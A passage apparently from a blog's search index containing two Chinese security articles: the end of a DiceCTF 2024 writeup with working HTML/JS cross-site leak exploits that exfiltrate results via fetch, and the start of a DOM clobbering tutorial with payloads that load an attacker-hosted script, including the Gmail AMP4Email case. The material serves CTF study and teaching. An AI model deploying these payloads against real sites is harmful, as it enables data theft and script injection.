&#123; timeout: 7500, waitUntil: \"networkidle2\" &#125;) // restart browser, which should close all windows await browser.close(); browser = await launchBrowser(); page = await browser.newPage(); // check on notes now that all other windows are closed await page.goto(\"http://localhost:3000\", &#123; timeout: 7500, waitUntil: \"networkidle2\" &#125;); await sleep(8000); await page.evaluate(() => &#123; document.querySelector(\"form[action='/view']\").submit(); &#125;); await page.waitForNavigation(&#123; waitUntil: \"networkidle2\" &#125;); await browser.close(); browser = null; &#125; catch (err) &#123; console.log(err); &#125; finally &#123; if (browser) await browser.close(); &#125; &#125;; 在訪問完我們提供的 URL 以後，bot 才去訪問 /view 頁面，因此這次我們沒辦法從瀏覽器上面去衡量時間，而是要從自己 local 去測量。如果前面講的想法沒錯，照理來說在我們 local 也可以測量出時間，server response time 會變慢。 但嘗試了大概三四個小時以後，發現行不通。 理由大概有兩點，第一點是 server 的處理速度太快，我測了一下發送 500 個請求給 localhost，大概 400ms 就處理完了，第二點是時間區間很難抓，很難掌握到「bot 訪問 &#x2F;view」的那段時間。 總之呢，試了很久都沒辦法得到一個穩定的辦法，只好先放棄了。 而此時我把注意力轉移到了新增 note 時的這一段： const newLen = totalLen + text.length; if (newLen > 16384) &#123; // case 1 return reply.redirect(`/?message=Cannot add, please delete some notes first ($&#123;newLen&#125; > 16384 chars)`); &#125; userNotes.push(text); userNotes.sort(); notes.set(req.cookies.id, userNotes); // case2 reply.redirect(\"/?message=Note added successfully\"); 如果筆記長度超出 16384，會重新導向到 /?message=Cannot add, please delete some notes first，反之則導向至 /?message=Note added successfully，換言之，如果可以偵測出導向到的是哪一個，一樣可以利用類似的手法 leak 出 flag。 我有個想法是猜測瀏覽器對於網址長度應該會有限制，可以試著構造出一個超長的網址，導向到 /?message=Cannot add, please delete some notes first 時會超過限制，而導向到 /?message=Note added successfully 時則不會。 但問題是這邊我們沒辦法控制 path 的長度，那該怎麼讓網址變長？ 我試了一下 username，例如說：http://$&#123;&#39;a&#39;.repeat(1000000)&#125;&#125;:pwd@localhost:3000，發現居然成功了！ 細節可以看底下這個 PoC： &lt;!DOCTYPE html> &lt;html> &lt;body> &lt;form id=f method=\"POST\" target=\"winForm\"> &lt;input id=inp name=\"text\" value=\"\"> &lt;/form> &lt;script> fetch('/hang') win = window.open('about:blank', 'winForm') const TARGET = 'http://'+ 'a'.repeat(2097050) + ':def@localhost:3000' f.action = TARGET + '/create' inp.value = 'a'.repeat(2) f.submit() let count = 0 setInterval(() => &#123; fetch('/timeout'+count) count++ try &#123; let r = win.location.href fetch('/?r=' + r) &#125; catch(err) &#123; fetch('/err') &#125; &#125;, 500) &lt;/script> &lt;/body> &lt;/html> 當我建立長度只有 2 的 note 時，網址在限制之內，因此正常開啟新的頁面，去拿 win.location.href 會觸發 cross-origin 的錯誤。 但如果是建立長度 20000 的 note 時，重新導向的頁面網址太長，所以觸發錯誤，導致新開的頁面變成了 about:blank，不會觸發錯誤。 因此，確實可以靠著網址長度這一點，得知 note 到底有沒有建立成功。 最後的 exploit 如下： &lt;!DOCTYPE html> &lt;html> &lt;body> &lt;form id=f method=\"POST\" target=\"winForm\"> &lt;input id=inp name=\"text\" value=\"\"> &lt;/form> &lt;form id=f_delete action=\"http://localhost:3000/remove\" method=\"POST\" target=\"_blank\"> &lt;input name=\"index\" value=\"0\"> &lt;/form> &lt;form id=f_create action=\"http://localhost:3000/create\" method=\"POST\" target=\"_blank\"> &lt;input id=inp2 name=\"text\" value=\"\"> &lt;/form> &lt;script> const sleep = ms => new Promise(r => setTimeout(r, ms)) fetch('/hang') win = window.open('about:blank', 'winForm') f.action = 'http://'+ 'a'.repeat(2097050) + ':def@localhost:3000' + '/create' let count = 0 setInterval(() => &#123; fetch('/ping_' + count) count++ &#125;, 100) // abcdefghijklmnopqrstuvwxyz async function main() &#123; // step1. create note let testPayload = 'dice&#123;xs' fetch('/step_1_start') inp2.value = testPayload + 'z'.repeat(10000) f_create.submit() await sleep(500) fetch('/step_1_end') // step2. delete first note fetch('/step_2_start') f_delete.submit() await sleep(500) fetch('/step_2_end') // step3. leak fetch('/step_3_start') inp.value = 'a'.repeat(10000) f.submit() fetch('/step_3_end') let count = 0 setInterval(() => &#123; fetch('/timeout'+count) count++ try &#123; let r = win.location.href fetch('/?r=' + r) &#125; catch(err) &#123; fetch('/err') &#125; // err: payload is before flag // dice&#123;azzz // dice&#123;flag&#125; // about:blank, payload is after flag // dice&#123;flag&#125; // dice&#123;fzzzz&#125; &#125;, 200) &#125; main() &lt;/script> &lt;/body> &lt;/html> 每 submit 一次，就能知道 flag 的順序在某個字元前面還後面，運用 binary search 的話，大約 submit 6 次可以知道結果，一次要等 30 秒，總共需要 3 分鐘，因為懶得自動化所以我就手動慢慢 leak 了。 大概花了 40 分鐘左右拿到 flag，不過這其實是 unintended 就是了。 預期解筆記一下 strellic 在 Discord 裡面貼的預期解法，用到了 background fetch API： install service worker and use background fetch api this essentially causes the browser to make a download, but this download is special since it resumes on browser start lax + post csrf a lot of img tags to purify.js, with a prefix that gets sorted against the flag (see safelist writeup for more details) delete the first post if your post was sorted first, it would be deleted if it was sorted last, it would not be deleted when the browser bot checks &#x2F;view, the browser will take longer to load the page if there are a lot of img tags if it takes longer to load the page, the browser lasts longer and closes later when it closes, the background fetch download stops so, by timing how long your background fetch stays connected to your server, you can leak the outcome of the sort, and the flag web&#x2F;burnbin (1 solve)先講一下，這題我沒解開也沒時間看，底下是參考作者的解答寫的。 這題的類型也是類似於經典的 note app，可以註冊一個新的帳號並且建立 note，建立的時候可以上傳一張圖片。 先來看一下 bot 的部分： const puppeteer = require(\"puppeteer\"); const crypto = require(\"crypto\"); const sleep = (ms) => new Promise(r => setTimeout(r, ms)); const visit = async (url) => &#123; const user = crypto.randomBytes(16).toString(\"hex\"); const pass = crypto.randomBytes(32).toString(\"hex\"); let browser; try &#123; browser = await puppeteer.launch(&#123; headless: \"new\", pipe: true, args: [ \"--no-sandbox\", \"--disable-setuid-sandbox\", \"--js-flags=--noexpose_wasm,--jitless\", ], dumpio: true &#125;); const context = await browser.createIncognitoBrowserContext(); const page = await context.newPage(); await page.goto(\"http://localhost:3000/register\", &#123; timeout: 5000, waitUntil: 'domcontentloaded' &#125;); // create new account await page.waitForSelector(\"button[type=submit]\"); await page.type(\"input[placeholder='Username']\", user); await page.type(\"input[placeholder='Password']\", pass); await page.click(\"button[type=submit]\"); await sleep(3000); // create paste with flag await page.type(\"input[placeholder='Title']\", \"Flag\"); await page.type(\"textarea[placeholder='Paste contents']\", \"Flag\"); const imgUpload = await page.$(\"input[type=file]\"); await imgUpload.uploadFile(\"./flag.png\"); await page.click(\"button[type=submit]\"); await sleep(3000); // go to exploit page await page.goto(url, &#123; timeout: 5000, waitUntil: 'domcontentloaded' &#125;); await sleep(30_000); await browser.close(); browser = null; &#125; catch (err) &#123; console.log(err); &#125; finally &#123; if (browser) await browser.close(); &#125; return user; &#125;; module.exports = &#123; visit &#125;; 會先隨機產生一組帳號密碼，註冊後上傳 flag 作為圖片，接著訪問我們的網頁。因此目標就是要偷走這張圖片，就可以拿到 flag。 這題前端在顯示 note 時，用的都是安全的顯示方式，所以沒辦法注入 HTML 等等，因此一定是要找別的方式，其中就屬上傳檔案最為可疑了： fastify.route(&#123; method: 'POST', path: '/api/create', onRequest: requiresLogin, handler: async (req, res) => &#123; const body = Object.fromEntries( Object.keys(req.body).map((key) => [key, req.body[key].value]) ); const &#123; title, text &#125; = body; if (typeof title !== \"string\" || typeof text !== \"string\") &#123; throw new Error(\"Title or text must be string\"); &#125; if (title.length > 32 || text.length > 512) &#123; throw new Error(\"Title or text too long\"); &#125; const id = crypto.randomBytes(8).toString(\"hex\"); const paste = &#123; id, title, text &#125;; if (req.body.file) &#123; const filename = sanitizeFilename(req.body.file.filename.slice(0, 64), \"-\"); const ext = filename.slice(filename.lastIndexOf(\".\")); if (![\".png\", \".jpeg\", \".jpg\"].includes(ext)) &#123; throw new Error(\"Invalid file format for image\"); &#125; const buffer = await req.body.file.toBuffer(); try &#123; await fsp.mkdir(path.join(__dirname, 'public', 'uploads', req.user.user)); &#125; catch &#123;&#125; try &#123; await fsp.writeFile(path.join(__dirname, 'public', 'uploads', req.user.user, filename), buffer); &#125; catch &#123;&#125; paste.image = `$&#123;req.user.user&#125;/$&#123;filename&#125;`; &#125; req.user.pastes.push(paste); return &#123; success: true &#125;; &#125; &#125;); 在上傳檔案時會檢查是否為 .png、.jpeg 或 .jpg 結尾，不是的話就拋出錯誤。雖然乍看之下只能上傳圖片，但如果上傳檔名是 .png 的檔案，在舊版的 fastify static 中就不會有 mimetype，這題也沒有禁止 mime sniffing，就能上傳 HTML 或是 CSS 檔案。 順帶一提，這一題的 CSP 如下： fastify.addHook('onRequest', (req, res, done) => &#123; if (req.session.get(\"username\") &amp;&amp; users.has(req.session.get(\"username\"))) &#123; req.user = users.get(req.session.get(\"username\")); &#125; res.header(\"Content-Security-Policy\", ` script-src 'sha256-BCut0I6hAnpHxUpwpaDB1crwgr249r2udW3tkBGQLv4=' 'unsafe-inline'; img-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/css2; font-src https://fonts.gstatic.com/s/inter/; frame-ancestors 'none'; object-src 'none'; base-uri 'none'; `.trim().replace(/\\s+/g, \" \")); res.header(\"Cache-Control\", \"no-cache, no-store\"); res.header(\"X-Frame-Options\", \"DENY\"); done(); &#125;); 雖然說乍看之下 script-src 有 unsafe-inline，但其實是沒作用的，嘗試了之後會發現底下錯誤： refused to execute inline script because it violates the following Content Security Policy directive: &quot;script-src &#39;sha256-BCut0I6hAnpHxUpwpaDB1crwgr249r2udW3tkBGQLv4&#x3D;&#39; &#39;unsafe-inline&#39;&quot;. Note that &#39;unsafe-inline&#39; is ignored if either a hash or nonce value is present in the source list. 因此這題可以用的 JavaScript 只有題目原先給的而已，其他都要靠 CSS 搞定。 利用以前作者出過的另外一題的技巧，可以藉由 dom clobbering defaultView 來決定 client router 要 render 哪一頁，就等於是可以在任意頁面注入 HTML 跟 CSS，細節可以參考我寫過的：corCTF 2022 writeup - modernblog。 我們需要先得到 /home 裡面會出現的 post id，再得到 /view/:id 裡面會出現的圖片路徑，就能取得 flag。這個 post id 的長度有 16 位，每一位都是 0-f，更麻煩的是這個 post id 每一次請求都會更新： fastify.route(&#123; method: 'GET', path: '/api/pastes', onRequest: requiresLogin, handler: (req, res) => &#123; req.user.pastes.forEach(p => p.id = crypto.randomBytes(8).toString(\"hex\")); return req.user.pastes.map((&#123; id, title &#125;) => (&#123; id, title &#125;)); &#125; &#125;); 作者給的解法是運用 CSS + iframe 來 leak 出頁面上的資訊，如果只是洩露出一位很簡單，可以利用長寬來做，像是： &lt;style> body:has(a[href^=\"/view/1\"]) iframe &#123; width: 1px; &#125; body:has(a[href^=\"/view/2\"]) iframe &#123; width: 2px; &#125; &lt;/style> 因為這邊 CSP 並沒有 frame-src，所以這個 iframe 會是我們的 origin，可以用 window.innerWidth 來得到寬度，藉此知道第一個字元是什麼。 但問題是每次請求都會不一樣，所以我們必須在一次之內得到所有字元，否則 id 就不同了。 如果要一次 leak 出這麼多字元，一種方式是使用之前在 0CTF 2023 中才提過的方式，另一種是 recursive import，但這種通常都需要有自己的 server 配合。 而作者則是利用了 connection pool 的上限解掉了後者的問題，connection pool 在 CTF 中出現的頻率不低，簡單來說就是把 Chromium 的 255 個 connection 都填滿，就能控制下一個資源什麼時候載入。 因此做法是： 先引入第一個 style（假設叫做 .jpg），裡面會 leak 出第一個字元並且 import .png 此時在我們的網頁把 connection 填滿，直到 leak 出第一個字並且上傳新的 style 檔案後才釋放 不斷重複以上做法 概念是應該是這樣，但實作上似乎有許多狀況需要考慮，會複雜許多，可以參考最後會附上的作者解法，裡面有更多細節。 leak 出 id 以後，接著就可以如法炮製，把圖片路徑也 leak 出來。 但重點是 view note 的頁面，會自動發送請求把圖片刪除，出現錯誤的話也會跳出 alert： import React from \"react\"; import &#123; Link, useParams, useNavigate &#125; from \"react-router-dom\"; import axios from 'axios'; export default function View() &#123; const &#123; id &#125; = useParams(); const navigate = useNavigate(); const [paste, setPaste] = React.useState(null); React.useEffect(() => &#123; (async () => &#123; try &#123; const r = await axios.get(`/api/paste/$&#123;id&#125;`); if (r.data) &#123; setPaste(r.data); if (!r.data.image) &#123; await deletePaste(r.data.id); &#125; &#125; &#125; catch (e) &#123; alert(e?.response?.data?.message || e.message); navigate(\"/home\"); &#125; &#125;)(); &#125;, []); const deletePaste = async (id) => &#123; try &#123; await axios.get(`/api/destroy/$&#123;id&#125;`); &#125; catch (e) &#123; alert(e?.response?.data?.message || e.message); navigate(\"/home\"); &#125; &#125;; if (!paste) &#123; return &lt;>&lt;/> &#125; return ( &lt;> &lt;h3>&#123;paste.title&#125;&lt;/h3> &#123; paste.image &amp;&amp; ( &lt;img src=&#123;`/uploads/$&#123;paste.image&#125;`&#125; onLoad=&#123;() => deletePaste(paste.id)&#125; onError=&#123;() => deletePaste(paste.id)&#125; className=\"mw-100\" /> )&#125; &lt;div style=&#123;&#123; whiteSpace: \"pre-line\" &#125;&#125; className=\"mb-2\">&#123;paste.text&#125;&lt;/div> &lt;Link to=\"/home\">← Back&lt;/Link> &lt;/> ); &#125; 可以用 meta tag 的 CSP connect-src 阻止刪除圖片的請求，並且用 iframe 的 sandbox 阻止跳出 modal。 不過我覺得這題最難的事情是要在 30 秒內把所有事情做完，等於說每一個環節都必須自動化，這個真的難。 底下附上作者 strellic 的解法，上面是參考他的解法寫的： uploading files as .png or .jpg have no mimetype (old version of fastify static) so they are mime sniffed (no xcto) and you can upload arb html &#x2F; css use technique from modernblog (clobber defaultView) and upload arb html that react router thinks is a target path. this lets us add custom html onto any page of the react app we want now, we need to leak both the flag post id and username. we do this with css injection and iframes we can use css to change the width&#x2F;height of an iframe, and since there is no frame-src, we can point it to our own domain and read these values i use window.open to get a window ref, then reading w.frames[0].innerWidth repeatedly the only issue is, how do we leak the entire id if on every refresh the post ids change? lets use the classic css recursive import (with a twist) the issue with recursive import is that you need to import from a server you control. you need this bc you need the next css file request to stop responding until you leak the previous data so you know what css to send. but style-src is self, so we cant stall the next css file - or can we? my solution: lets abuse the connection pool! if we block every socket on another tab, we can stop the css from importing until we are ready, and we unblock and reblock the socket pool at will this allows us to control the time at which the next css file is uploaded, essentially letting us recreate the recursive css technique even when we dont control the target server! this is a little complicated, we need to remove type module from script tag so it doesnt block, as well as move it to body. in addition we have to start the initial css req in a style tag (which is why unsafe-inline is there), otherwise it blocks we also need to create a “buffer” of empty css files that just request another one so we can account for the initial api requests (as they happen in tandem with the css requests) with this you can leak the post id now to leak the username, you do the same technique but need to stop the image from deleting use a csp meta tag with connect src to stop it from requesting the destroy endpoint but this causes an alert which blocks everything, so you put this in an iframe srcdoc that doesnt allow modals do all of this in 30 seconds and you can get the flag! (my solve finishes in 25s with no optimization) 後記最近有其他事情在忙，有段時間沒打 CTF 了，總覺得有點生疏，不過把 safestlist 解掉真的滿開心的，代表身手沒有退步太多XD 除此之外，這篇也是相隔了兩個月之後的更新，是 2024 年的第一篇，雖然有點晚了，不過還是祝各位讀者新年快樂。","link":"/2024/02/12/dicectf-2024-writeup/"},{"title":"淺談 DOM Clobbering 的原理及應用","text":"前言說身為一個前端工程師，理所當然會知道很多與前端相關的知識，像是 HTML 或是 JS 相關的東西，但那些知識通常都與「使用」有關。例如說我知道寫 HTML 的時候要 semantic，要使用正確的標籤；我知道 JS 應該要怎麼用。可是呢，有些知識雖然也跟網頁有關，卻不是前端工程師平常會接觸到的。 我所謂的「有些知識」，指的其實是「資訊安全相關的知識」。有些在資訊安全裡面常見的觀念，雖然跟網頁有關，卻是我們不太熟悉的東西，而我認為理解這些其實是很重要的。因為你必須懂得怎麼攻擊才能防禦，要先知道攻擊手法跟原理，才知道該怎麼防範這些攻擊。 在正式開始之前，先給大家一個趣味題目小試身手。 假設你有一段程式碼，有一個按鈕以及一段 script，如下所示： &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;meta charset=\"utf-8\"> &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"> &lt;/head> &lt;body> &lt;button id=\"btn\">click me&lt;/button> &lt;script> // TODO: add click event listener to button &lt;/script> &lt;/body> &lt;/html> 現在請你嘗試用「最短的程式碼」，實作出「點下按鈕時會跳出 alert(1)」這個功能。 舉例來說，這樣寫可以達成目標： document.getElementById('btn') .addEventListener('click', () => &#123; alert(1) &#125;) 那如果要讓程式碼最短，你的答案會是什麼？ 大家可以在往下看以前先想一下這個問題，想好以後就讓我們正式開始吧！ 防雷............. DOM 與 window 的量子糾纏你知道 DOM 裡面的東西，有可能影響到 window 嗎？ 這個行為是我幾年前在臉書的前端社群無意間得知的，那就是你在 HTML 裡面設定一個有 id 的元素之後，在 JS 裡面就可以直接存取到它： &lt;button id=\"btn\">click me&lt;/button> &lt;script> console.log(window.btn) // &lt;button id=\"btn\">click me&lt;/button> &lt;/script> 然後因為 JS 的 scope，所以你就算直接用 btn 也可以，因為當前的 scope 找不到就會往上找，一路找到 window。 所以開頭那題，答案是： btn.onclick = () => alert(1) 不需要 getElementById，也不需要 querySelector，只要直接用跟 id 同名的變數去拿，就可以拿得到。應該不會有比這個更短的程式碼了（有的話歡迎留言打臉我QQ） 而這個行為是有明確定義在 spec 上的，在 7.3.3 Named access on the Window object： 幫大家節錄兩個重點： the value of the name content attribute for all embed, form, img, and object elements that have a non-empty name content attribute the value of the id content attribute for all HTML elements that have a non-empty id content attribute 也就是說除了 id 可以直接用 window 存取到以外，embed, form, img 跟 object 這四個 tag 用 name 也可以存取到： &lt;embed name=\"a\">&lt;/embed> &lt;form name=\"b\">&lt;/form> &lt;img name=\"c\" /> &lt;object name=\"d\">&lt;/object> 但是知道這個有什麼用呢？有，理解這個規格之後，我們可以得出一個結論： 我們是有機會透過 HTML 元素來影響 JS 的 而這個手法用在攻擊上，就是標題的 DOM Clobbering。之前是因為這個攻擊才第一次聽到 clobbering 這個單字的，去查一下發現在 CS 領域中有覆蓋的意思，就是透過 DOM 把一些東西覆蓋掉以達成攻擊的手段。 DOM Clobbering 入門那在什麼場景之下有機會用 DOM Clobbering 攻擊呢？ 首先，你必須有機會在頁面上顯示你自訂的 HTML，否則就沒有辦法了。所以一個可以攻擊的場景可能會像是這樣： &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;meta charset=\"utf-8\"> &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"> &lt;/head> &lt;body> &lt;h1>留言板&lt;/h1> &lt;div> 你的留言：哈囉大家好 &lt;/div> &lt;script> if (window.TEST_MODE) &#123; // load test script var script = document.createElement('script') script.src = window.TEST_SCRIPT_SRC document.body.appendChild(script) &#125; &lt;/script> &lt;/body> &lt;/html> 假設現在有一個留言板，你可以輸入任意內容，但是你的輸入在 server 端會透過 DOMPurify 來做處理，把任何可以執行 JavaScript 的東西給拿掉，所以 &lt;script&gt;&lt;/script&gt; 會被刪掉，&lt;img src=x onerror=alert(1)&gt; 的 onerror 會被拿掉，還有許多 XSS payload 都沒有辦法過關。 簡而言之，你沒辦法執行 JavaScript 來達成 XSS，因為這些都被過濾掉了。 但是因為種種因素，並不會過濾掉 HTML 標籤，所以你可以做的事情是顯示自訂的 HTML。只要沒有執行 JS，你想要插入什麼 HTML 標籤，設置什麼屬性都可以。 所以呢，你可以這樣做： &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;meta charset=\"utf-8\"> &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"> &lt;/head> &lt;body> &lt;h1>留言板&lt;/h1> &lt;div> 你的留言：&lt;div id=\"TEST_MODE\">&lt;/div> &lt;a id=\"TEST_SCRIPT_SRC\" href=\"my_evil_script\">&lt;/a> &lt;/div> &lt;script> if (window.TEST_MODE) &#123; // load test script var script = document.createElement('script') script.src = window.TEST_SCRIPT_SRC document.body.appendChild(script) &#125; &lt;/script> &lt;/body> &lt;/html> 根據我們上面所得到的知識，可以插入一個 id 是 TEST_MODE 的標籤 &lt;div id=&quot;TEST_MODE&quot;&gt;&lt;/div&gt;，這樣底下 JS 的 if (window.TEST_MODE) 就會過關，因為 window.TEST_MODE 會是這個 div 元素。 再來我們可以用 &lt;a id=&quot;TEST_SCRIPT_SRC&quot; href=&quot;my_evil_script&quot;&gt;&lt;/a&gt;，來讓 window.TEST_SCRIPT_SRC 轉成字串之後變成我們想要的字。 在大多數的狀況中，只是把一個變數覆蓋成 HTML 元素是不夠的，例如說你把上面那段程式碼當中的 window.TEST_MODE 轉成字串印出來： // &lt;div id=\"TEST_MODE\" /> console.log(window.TEST_MODE + '') 結果會是：[object HTMLDivElement]。 把一個 HTML 元素轉成字串就是這樣，會變成這種形式，如果是這樣的話那基本上沒辦法利用。但幸好在 HTML 裡面有兩個元素在 toString 的時候會做特殊處理：&lt;base&gt; 跟 &lt;a&gt;： 來源：4.6.3 API for a and area elements 這兩個元素在 toString 的時候會回傳 URL，而我們可以透過 href 屬性來設置 URL，就可以讓 toString 之後的內容可控。 所以綜合以上手法，我們學到了： 用 HTML 搭配 id 屬性影響 JS 變數 用 a 搭配 href 以及 id 讓元素 toString 之後變成我們想要的值 透過上面這兩個手法再搭配適合的場景，就有機會利用 DOM Clobbering 來做攻擊。 不過這邊要提醒大家一件事，如果你想攻擊的變數已經存在的話，你用 DOM 是覆蓋不掉的，例如說： &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;script> TEST_MODE = 1 &lt;/script> &lt;/head> &lt;body> &lt;div id=\"TEST_MODE\">&lt;/div> &lt;script> console.log(window.TEST_MODE) // 1 &lt;/script> &lt;/body> &lt;/html> 多層級的 DOM Clobbering在前面的範例中，我們用 DOM 把 window.TEST_MODE 蓋掉，創造出未預期的行為。那如果要蓋掉的對象是個物件，有機會嗎？ 例如說 window.config.isTest，這樣也可以用 DOM clobbering 蓋掉嗎？ 有幾種方法可以蓋掉，第一種是利用 HTML 標籤的層級關係，具有這樣特性的是 form，表單這個元素： 在 HTML 的 spec 中有這樣一段： 可以利用 form[name] 或是 form[id] 去拿它底下的元素，例如說： &lt;!DOCTYPE html> &lt;html> &lt;body> &lt;form id=\"config\"> &lt;input name=\"isTest\" /> &lt;button id=\"isProd\">&lt;/button> &lt;/form> &lt;script> console.log(config) // &lt;form id=\"config\"> console.log(config.isTest) // &lt;input name=\"isTest\" /> console.log(config.isProd) // &lt;button id=\"isProd\">&lt;/button> &lt;/script> &lt;/body> &lt;/html> 如此一來就可以構造出兩層的 DOM clobbering。不過有一點要注意，那就是這邊沒有 a 可以用，所以 toString 之後都會變成沒辦法利用的形式。 這邊比較有可能利用的機會是，當你要覆蓋的東西是用 value 存取的時候，例如說：config.enviroment.value，就可以利用 input 的 value 屬性做覆蓋： &lt;!DOCTYPE html> &lt;html> &lt;body> &lt;form id=\"config\"> &lt;input name=\"enviroment\" value=\"test\" /> &lt;/form> &lt;script> console.log(config.enviroment.value) // test &lt;/script> &lt;/body> &lt;/html> 簡單來說呢，就是只有那些內建的屬性可以覆蓋，其他是沒有辦法的。 除了利用 HTML 本身的層級以外，還可以利用另外一個特性：HTMLCollection。 在我們稍早看到的關於 Named access on the Window object 的 spec 當中，決定值是什麼的段落是這樣寫的： 如果要回傳的東西有多個，就回傳 HTMLCollection。 &lt;!DOCTYPE html> &lt;html> &lt;body> &lt;a id=\"config\">&lt;/a> &lt;a id=\"config\">&lt;/a> &lt;script> console.log(config) // HTMLCollection(2) &lt;/script> &lt;/body> &lt;/html> 那有了 HTMLCollection 之後可以做什麼呢？在 4.2.10.2. Interface HTMLCollection 中有寫到，可以利用 name 或是 id 去拿 HTMLCollection 裡面的元素。 像是這樣： &lt;!DOCTYPE html> &lt;html> &lt;body> &lt;a id=\"config\">&lt;/a> &lt;a id=\"config\" name=\"apiUrl\" href=\"https://huli.tw\">&lt;/a> &lt;script> console.log(config.apiUrl + '') // https://huli.tw &lt;/script> &lt;/body> &lt;/html> 就可以透過同名的 id 產生出 HTMLCollection，再用 name 來抓取 HTMLCollection 的特定元素，一樣可以達到兩層的效果。 而如果我們把 form 跟 HTMLCollection 結合在一起，就能夠達成三層： &lt;!DOCTYPE html> &lt;html> &lt;body> &lt;form id=\"config\">&lt;/form> &lt;form id=\"config\" name=\"prod\"> &lt;input name=\"apiUrl\" value=\"123\" /> &lt;/form> &lt;script> console.log(config.prod.apiUrl.value) //123 &lt;/script> &lt;/body> &lt;/html> 先利用同名的 id，讓 config 可以拿到 HTMLCollection，再來用 config.prod 就可以拿到 HTMLCollection 中 name 是 prod 的元素，也就是那個 form，接著就是 form.apiUrl 拿到表單底下的 input，最後用 value 拿到裡面的屬性。 所以如果最後要拿的屬性是 HTML 的屬性，就可以四層，否則的話就只能三層。 再更多層級的 DOM Clobbering前面提到三層或是有條件的四層已經是極限了，那有沒有辦法再突破限制呢？ 根據 DOM Clobbering strikes back 裡面給的做法，有，利用 iframe 就可以達到！ 當你建了一個 iframe 並且給它一個 name 的時候，用這個 name 就可以指到 iframe 裡面的 window，所以可以像這樣： &lt;!DOCTYPE html> &lt;html> &lt;body> &lt;iframe name=\"config\" srcdoc=' &lt;a id=\"apiUrl\">&lt;/a> '>&lt;/iframe> &lt;script> setTimeout(() => &#123; console.log(config.apiUrl) // &lt;a id=\"apiUrl\">&lt;/a> &#125;, 500) &lt;/script> &lt;/body> &lt;/html> 這邊之所以會需要 setTimeout 是因為 iframe 並不是同步載入的，所以需要一些時間才能正確抓到 iframe 裡面的東西。 有了 iframe 的幫助之後，就可以創造出更多層級： &lt;!DOCTYPE html> &lt;html> &lt;body> &lt;iframe name=\"moreLevel\" srcdoc=' &lt;form id=\"config\">&lt;/form> &lt;form id=\"config\" name=\"prod\"> &lt;input name=\"apiUrl\" value=\"123\" /> &lt;/form> '>&lt;/iframe> &lt;script> setTimeout(() => &#123; console.log(moreLevel.config.prod.apiUrl.value) //123 &#125;, 500) &lt;/script> &lt;/body> &lt;/html> 理論上你可以在 iframe 裡面再用一個 iframe，就可以達成無限多層級的 DOM clobbering，不過我試了一下發現可能有點編碼的問題需要處理，例如說像是這樣： &lt;!DOCTYPE html> &lt;html> &lt;body> &lt;iframe name=\"level1\" srcdoc=' &lt;iframe name=\"level2\" srcdoc=\" &lt;iframe name=\"level3\">&lt;/iframe> \">&lt;/iframe> '>&lt;/iframe> &lt;script> setTimeout(() => &#123; console.log(level1.level2.level3) // undefined &#125;, 500) &lt;/script> &lt;/body> &lt;/html> 印出來會是 undefined，但如果把 level3 的那兩個雙引號拿掉，直接寫成 name=level3 就可以成功印出東西來，我猜是因為單引號雙引號的一些解析問題造成的，目前還沒找到什麼解法，只嘗試了這樣是 ok 的，但是再往下就出錯了： &lt;!DOCTYPE html> &lt;html> &lt;body> &lt;iframe name=\"level1\" srcdoc=\" &lt;iframe name=&amp;quot;level2&amp;quot; srcdoc=&amp;quot; &lt;iframe name='level3' srcdoc=' &lt;iframe name=level4>&lt;/iframe> '>&lt;/iframe> &amp;quot;>&lt;/iframe> \">&lt;/iframe> &lt;script> setTimeout(() => &#123; console.log(level1.level2.level3.level4) &#125;, 500) &lt;/script> &lt;/body> &lt;/html> 但現實生活中應該也不會到這麼深的層級啦，所以四層頂多五層就已經很夠用了。 2021-08-14 補充：感謝朋友的告知，用這樣就可以無限多層了 &lt;iframe name=a srcdoc=\" &lt;iframe name=b srcdoc=&amp;quot &lt;iframe name=c srcdoc=&amp;amp;quot; &lt;iframe name=d srcdoc=&amp;amp;amp;quot; &lt;iframe name=e srcdoc=&amp;amp;amp;amp;quot; &lt;iframe name=f srcdoc=&amp;amp;amp;amp;amp;quot; &lt;div id=g>123&lt;/div> &amp;amp;amp;amp;amp;quot;>&lt;/iframe> &amp;amp;amp;amp;quot;>&lt;/iframe> &amp;amp;amp;quot;>&lt;/iframe> &amp;amp;quot;>&lt;/iframe> &amp;quot>&lt;/iframe> \">&lt;/iframe> 實際案例研究：Gmail AMP4Email XSS在 2019 年的時候 Gmail 有一個漏洞就是透過 DOM clobbering 來攻擊的，完整的 write up 在這邊：XSS in GMail’s AMP4Email via DOM Clobbering，底下我就稍微講一下過程（內容都取材自上面這篇文章）。 簡單來說呢，在 Gmail 裡面你可以使用部分 AMP 的功能，然後 Google 針對這個格式的 validator 很嚴謹，所以沒有辦法透過一般的方法 XSS。 但是有人發現可以在 HTML 元素上面設置 id，又發現當他設置了一個 &lt;a id=&quot;AMP_MODE&quot;&gt; 之後，console 突然出現一個載入 script 的錯誤，而且網址中的其中一段是 undefined。仔細去研究程式碼之後，有一段程式碼大概是這樣的： var script = window.document.createElement(\"script\"); script.async = false; var loc; if (AMP_MODE.test &amp;&amp; window.testLocation) &#123; loc = window.testLocation &#125; else &#123; loc = window.location; &#125; if (AMP_MODE.localDev) &#123; loc = loc.protocol + \"//\" + loc.host + \"/dist\" &#125; else &#123; loc = \"https://cdn.ampproject.org\"; &#125; var singlePass = AMP_MODE.singlePassType ? AMP_MODE.singlePassType + \"/\" : \"\"; b.src = loc + \"/rtv/\" + AMP_MODE.rtvVersion; + \"/\" + singlePass + \"v0/\" + pluginName + \".js\"; document.head.appendChild(b); 如果我們能讓 AMP_MODE.test 跟 AMP_MODE.localDev 都是 truthy 的話，再搭配設置 window.testLocation，就能夠載入任意的 script！ 所以 exploit 會長的像這樣： // 讓 AMP_MODE.test 跟 AMP_MODE.localDev 有東西 &lt;a id=\"AMP_MODE\" name=\"localDev\">&lt;/a> &lt;a id=\"AMP_MODE\" name=\"test\">&lt;/a> // 設置 testLocation.protocol &lt;a id=\"testLocation\">&lt;/a> &lt;a id=\"testLocation\" name=\"protocol\" href=\"https://pastebin.com/raw/0tn8z0rG#\">&lt;/a> 最後就能成功載入任意 script，進而達成 